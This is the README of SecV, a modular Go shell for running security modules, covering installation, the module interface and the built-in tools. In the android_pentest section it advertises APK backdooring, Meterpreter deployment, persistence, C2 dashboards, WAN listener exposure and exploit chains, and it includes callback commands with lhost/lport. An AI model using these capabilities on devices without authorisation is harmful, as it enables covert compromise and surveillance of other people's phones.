<div align="center">

```
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
 █                                █
 █   ███████╗███████╗ ██████╗██╗  █
 █   ██╔════╝██╔════╝██╔════╝██║  █
 █   ███████╗█████╗  ██║     ██║  █
 █   ╚════██║██╔══╝  ██║     ╚╝   █
 █   ███████║███████╗╚██████╗     █
 █   ╚══════╝╚══════╝ ╚═════╝  ⚡ █
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
```

### zephra

`Go` · `Python` · `Bash` · `Rust` · `C++` — one shell, any language

---

[![Version](https://img.shields.io/badge/v2.4.0-zephra-0d1117?style=flat-square&labelColor=00d9ff&color=0d1117)](https://github.com/SecVulnHub/SecV)
[![License](https://img.shields.io/badge/MIT-license-0d1117?style=flat-square&labelColor=8b5cf6&color=0d1117)](LICENSE)
[![Go](https://img.shields.io/badge/Go_1.21+-required-0d1117?style=flat-square&labelColor=00ADD8&color=0d1117)](https://golang.org/)
[![Platform](https://img.shields.io/badge/Linux%20%7C%20macOS-0d1117?style=flat-square&labelColor=3a3f4b&color=0d1117)](#)

</div>

---

## Overview

SecV is a compiled Go shell that loads and runs security modules written in any language. The loader handles module discovery, JSON I/O, timeouts, dependency checking, and tab completion. You write the logic — in Python, Bash, Go, Rust, C++, whatever works.

```
secV ❯ use netrecon
secV (netrecon) ❯ set ports top-100
secV (netrecon) ❯ run 192.168.1.0/24
```

---

## Installation

```bash
git clone https://github.com/SecVulnHub/SecV.git
cd SecV
chmod +x install.sh && ./install.sh
```

The installer detects your distro (Arch, Debian, Fedora, Alpine) and installs missing tools using the right package manager. It compiles the Go binary and optionally installs it system-wide.

```bash
./secV          # from repo directory
secV            # if installed system-wide
```

---

## Shell Commands

```
# Navigation
show modules          list all available modules
search <keyword>      search by name or category
use <module>          load a module
back                  unload current module
reload                rescan tools/ directory
info <module>         module details + dependency status

# Module interaction
show options          list parameters
set <key> <value>     assign a parameter
run <target>          execute against target
help module           module-specific help

# System
update                pull latest from git + recompile
clear                 clear terminal
exit
```

Tab completion is active for all commands and module names.

---

## Module Architecture

SecV passes context to modules via **JSON on stdin** and reads results from stdout. There is no framework to import — just read stdin, do your work, write output.

```json
// stdin → your module
{
  "target": "example.com",
  "params": {
    "ports": "top-100",
    "engine": "syn"
  }
}
```

### Python

```python
#!/usr/bin/env python3
import json, sys

ctx    = json.loads(sys.stdin.read())
target = ctx["target"]
params = ctx.get("params", {})

# your logic

print(json.dumps({"success": True, "data": {"target": target}}))
```

### Bash

```bash
#!/usr/bin/env bash
input=$(cat)
target=$(echo "$input" | jq -r '.target')

# your logic

jq -n --arg t "$target" '{"success": true, "data": {"target": $t}}'
```

### `module.json`

Every module needs a manifest alongside its executable:

```json
{
  "name":        "my-scanner",
  "version":     "1.0.0",
  "category":    "scanning",
  "description": "Brief description",
  "author":      "you",
  "executable":  "python3 scanner.py",

  "dependencies": ["python3", "nmap"],
  "optional_dependencies": {
    "scapy": "SYN scan support — pip3 install scapy"
  },

  "inputs": {
    "target": { "type": "string",  "required": true },
    "ports":  { "type": "string",  "default": "1-1000" },
    "threads":{ "type": "integer", "default": 50 }
  },

  "timeout": 300
}
```

List binary names in `dependencies` (e.g. `adb`, `nmap`) — SecV checks them with `which` and offers to install missing ones using your system's package manager.

Drop your module into `tools/<category>/<name>/` and run `reload`.

---

## Built-in Modules

### `netrecon` — Network Reconnaissance

Concurrent multi-engine network profiling. Runs nmap, masscan, rustscan, and arp-scan simultaneously, merges results, and correlates CVEs against detected services. Detects iOS/Apple devices via port 62078 (lockdownd) and mDNS.

```bash
use netrecon
set mode network
set ports top-100
run 192.168.1.0/24
```

---

### `android_pentest` — Android Security Testing

Full-lifecycle Android pentesting suite — from passive recon to active exploitation and persistence. Supports rooted and non-rooted devices, ADB over USB and WiFi, multi-device sweeps, and on-device native agent deployment.

| Operation          | Description                                                                       |
|--------------------|-----------------------------------------------------------------------------------|
| `recon`            | Device fingerprint, root status, SELinux, chipset                                 |
| `app_scan`         | APK analysis, manifest audit, security score                                      |
| `vuln_scan`        | 50+ checks, OWASP Mobile Top 10, NVD live CVEs (incl. MediaTek)                  |
| `exploit`          | Intent injection, SQLi, content provider attacks                                  |
| `network`          | Traffic capture, SSL inspection, proxy                                            |
| `forensics`        | Data extraction, artifact analysis                                                |
| `frida_hook`       | Deploy frida-server, auto-hook app: SSL unpin, root bypass, cred dump, trace      |
| `objection_patch`  | Embed Frida gadget via Objection (no root at runtime), repackage and sign APK     |
| `get_root`         | Multi-vector root: Magisk, adb root, CVE-2024-0044, mtk-su, KernelSU             |
| `inject_agent`     | Push native recon agent, receive JSON report via TCP C2, auto-escalate            |
| `adb_wifi`         | Enable ADB over WiFi, drop USB dependency                                         |
| `deploy_shell`     | Generate + install Meterpreter APK (no root, bypasses settings)                   |
| `backdoor_apk`     | Pull target APK, inject msfvenom payload (-x template), sign, optionally install  |
| `rebuild`          | Build Termux:Boot WAN C2 APK: BootReceiver + DexClassLoader + bore tunnels + QR  |
| `persist`          | Termux:Boot + Magisk module persistence                                           |
| `hook`             | Three-vector persistence hook: Magisk service.sh, SharedUID shell, LSPosed/Zygote|
| `unhook`           | Remove all persistence hooks planted by the hook operation                        |
| `exploit_cve`      | Targeted CVE exploitation (CVE-2024-0044, CVE-2023-45866, CVE-2024-31317, etc.)  |
| `cve_chain`        | Run predefined CVE chain: bt_to_root, sandbox_exfil, zero_click_full              |
| `zero_click`       | Probe zero-click surfaces: Bluetooth HID, NFC, WiFi broadcast, media parsing      |
| `qr_exploit`       | Generate QR code for APK download, Android Intent URI, ADB WiFi pairing, deeplink|
| `device_net_scan`  | Scan device WiFi via netrecon, detect exposed ADB TCP and web services            |
| `wan_expose`       | Expose MSF listener and APK HTTP server via Cloudflare Tunnel for WAN delivery    |
| `msf_handler`      | Launch Metasploit multi/handler and start msfrpcd for GUI session management      |
| `full_pwn`         | 7-step chain: recon + adb_wifi + get_root + device_net_scan + shell + persist + WAN|
| `multi_device`     | Run any operation across all connected devices simultaneously                     |
| `c2_gui`           | Launch the secV web C2 dashboard (bore tunnels, MSF sessions, QR, ops, logs)     |
| `c2_cli`           | Launch C2 server in CLI mode (no browser)                                         |
| `full`             | Full recon + vuln_scan + exploit + network + forensics                            |

**On-device agent** (`tools/mobile/android/agent/`):
- `secv_agent.sh` - shell script, works on any Android without compilation
- `secv_agent.c` - compiled ARM64 binary (faster, NDK cross-compile via `build.sh`)
- `c2_server.py` - standalone TCP+HTTP C2 server with interactive REPL

**APK backdoor tool** (`tools/mobile/android/apk_backdoor/`):
- `build_bootbuddy.py` - repackage any APK with BootReceiver + AgentService + DexClassLoader chain, WAN C2 via bore tunnels, QR delivery

**C2 web dashboard** (`tools/mobile/android/c2_gui.py`):
- Sessions tab: live agent callbacks, interact, run shell commands
- Bore tab: start/stop WAN tunnels, HTTP file server, full C2 stack
- MSF tab: Meterpreter sessions via msfrpcd, run commands
- QR tab: generate delivery QR codes for any URL
- Operations tab: run any android_pentest operation from the browser
- Logs tab: encrypted .scv session archives with 5-layer password protection

```bash
# Basic recon via agent
use android_pentest
set operation inject_agent
set agent_mode recon
run device

# Launch C2 GUI then run rebuild (builds WAN APK, bore tunnels, QR)
use android_pentest
set operation rebuild
set c2_gui true
run device

# Full exploitation chain with root shell callback
use android_pentest
set operation inject_agent
set agent_mode exploit
set escalate true
set lhost 192.168.1.100
set lport 4444
run device

# Static APK analysis
use android_pentest
set operation app_scan
set package com.target.app
run device
```

---

### `ios_pentest` — iOS Security Testing

Connects via libimobiledevice. Checks security posture, installed apps, jailbreak indicators, entitlements, and ATS configuration. Runs live NVD keyword searches for iOS-version-specific CVEs. Covers non-jailbroken and jailbroken assessment paths.

```bash
use ios_pentest
set operation recon
run device
```

---

### `mac_spoof` — MAC Address Rotation

Per-interface background daemons with locally-administered address generation, configurable rotation interval, and state persistence.

```bash
sudo secV
use mac_spoof
set iface wlan0
set interval 300
run localhost
```

---

### `wifi_monitor` — Smart WiFi Monitor

Real-time host discovery via ARP (scapy) with TCP-ping fallback, async per-host port scanning, device fingerprinting (IoT, router, NAS, database server), CVE lookup via CIRCL API, and threat detection for exposed databases, Telnet, FTP, and end-of-life SSH.

```bash
sudo secV
use wifi_monitor
run 192.168.1.0/24
```

---

### `websec` — Web Security Research Tool

Burp Suite-style terminal tool for bug bounty and web security research. Covers DNS/WHOIS/SSL OSINT, security headers audit, CORS misconfiguration testing, cookie flag analysis, directory discovery, error-based SQLi, reflected XSS, web spidering, Google dork generation, WAF fingerprinting, and a built-in OWASP vulnerability knowledge base. Every operation includes `[LEARN]` context. Works with stdlib only, enhanced with `requests` and `beautifulsoup4`.

| Operation   | Description                                                          |
|-------------|----------------------------------------------------------------------|
| `recon`     | DNS, WHOIS, SSL cert, robots.txt, Wayback Machine, tech stack        |
| `headers`   | Security headers audit (HSTS, CSP, X-Frame-Options, etc.)           |
| `cors`      | CORS misconfiguration: wildcard, origin reflection, credentials      |
| `cookies`   | Cookie flag audit: Secure, HttpOnly, SameSite                        |
| `dirs`      | Directory/file discovery with 100+ built-in paths + custom wordlist  |
| `sqli`      | Error-based SQL injection (15+ database error patterns)              |
| `xss`       | Reflected XSS via input reflection testing                           |
| `spider`    | Crawl site, map URLs, forms, JS files                                |
| `dork`      | Generate 18+ Google dork queries and OSINT resource links            |
| `ssl`       | Deep SSL/TLS: version, cipher suites, cert details                   |
| `waf`       | Detect Cloudflare, AWS WAF, ModSecurity, Akamai, Imperva, F5, Sucuri |
| `full`      | All non-intrusive checks in one pass                                 |
| `vulnlib`   | Browse built-in OWASP vulnerability knowledge base                   |

```bash
use websec
set operation recon
run https://example.com

# Directory discovery with custom wordlist
use websec
set operation dirs
set threads 20
set wordlist_file /usr/share/seclists/Discovery/Web-Content/common.txt
run https://example.com
```

---

### `webscan` — Web Vulnerability Scanner

OWASP Top 10 web scanner: error-based and time-based SQL injection (MySQL, PostgreSQL, MSSQL), reflected XSS, CSRF detection, 403 bypass (header injection + path tricks), open redirect, Jira/AEM/Confluence CVEs, security headers audit, and file upload detection. Supports authenticated scanning via cookies.

```bash
use webscan
set url https://example.com/search?q=test
run https://example.com
```

---

## `gen_module.py` — Module JSON Generator

Auto-generates `module.json` by scanning your source for `params.get()`, `argparse`, and Bash `jq .params.X` patterns. Infers types, defaults, and required flags.

```bash
# Generate and print
python3 gen_module.py tools/network/my-tool/

# Write module.json into the tool directory
python3 gen_module.py tools/network/my-tool/ --write

# Merge newly detected params into an existing hand-written module.json
python3 gen_module.py tools/network/my-tool/ --update
```

Fill in `help.parameters[*].description` and `help.examples` manually — the generator leaves those empty since they require human context.

---

## Module Development

```bash
mkdir -p tools/scanning/my-tool && cd tools/scanning/my-tool

cat > module.json << 'EOF'
{
  "name": "my-tool",
  "version": "1.0.0",
  "category": "scanning",
  "description": "Does a thing",
  "author": "you",
  "executable": "python3 main.py",
  "dependencies": ["python3"],
  "inputs": {
    "target": { "type": "string", "required": true }
  },
  "timeout": 60
}
EOF

cat > main.py << 'EOF'
#!/usr/bin/env python3
import json, sys
ctx = json.loads(sys.stdin.read())
# your logic here
print(json.dumps({"success": True, "data": {"target": ctx["target"]}}))
EOF

chmod +x main.py
```

Test:

```bash
cd ../../..
./secV
secV ❯ reload
secV ❯ use my-tool
secV (my-tool) ❯ run example.com
```

**Before opening a PR:**

- [ ] Works without optional dependencies (graceful degradation)
- [ ] `module.json` is valid JSON with all required fields
- [ ] `README.md` inside the module directory
- [ ] Handles errors — no unhandled exceptions to stdout
- [ ] Lists binary names (not package names) in `dependencies`

---

## Update System

SecV pulls from `https://github.com/secvulnhub/SecV.git`. On update it stashes local changes, pulls, recompiles the binary if `main.go` changed, and installs Python deps if `requirements.txt` changed.

```bash
secV ❯ update                      # interactive update

python3 update.py                  # check and apply
python3 update.py --status         # component status
python3 update.py --verify         # integrity check
python3 update.py --repair         # fix common issues
python3 update.py --rollback       # restore last backup
python3 update.py --sync-tools     # fix module script permissions
```

---

## Troubleshooting

**Module not found after adding**
```bash
secV ❯ reload
```

**Permission denied**
```bash
chmod +x secV install.sh
```

**Go binary won't compile**
```bash
sudo pacman -S go          # Arch
sudo apt install golang    # Debian/Ubuntu
brew install go            # macOS

cd /path/to/SecV
go mod tidy
go build -o secV .
```

**Update fails with merge conflict**
```bash
git stash && git pull && git stash pop
python3 update.py --rollback   # or restore backup
```

---

## Legal

SecV is for **authorized security testing only.** You must have explicit written permission before scanning or testing any system you do not own.

Unauthorized use may violate computer fraud statutes. The authors accept no liability for misuse.

---

## License

MIT © 2024–2026 SecVulnHub

---

<div align="center">

**SecV** · zephra · built by 0xb0rn3

</div>
